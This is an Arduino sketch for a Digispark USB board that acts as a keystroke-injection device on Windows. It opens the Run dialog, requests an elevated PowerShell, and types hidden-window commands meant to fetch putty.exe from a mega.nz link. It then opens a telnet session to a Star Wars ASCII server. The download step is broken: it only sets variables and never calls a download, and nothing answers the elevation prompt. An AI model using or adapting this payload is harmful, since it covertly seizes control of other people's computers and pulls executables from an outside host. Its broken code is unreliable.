#include "DigiKeyboard.h"
void setup() {
  // put your setup code here, to run once:

}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("PowerShell.exe -windowstyle hidden {$down = New-Object System.Net.WebClient; $url = 'https://mega.nz/#!zjQxQIzL!Y8VdhFptOSyXg05uKmIPP8Miq6pmWBiSp6-ef1EAMBM'; $file = '\putty.exe'}");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("PowerShell.exe -windowstyle hidden {putty.exe -geometry 1000x1000 -telnet -P 23 towel.blinkenlights.nl}");
  DigiKeyboard.delay(1000);
  for (;;) {
    /*empty*/
  }
}
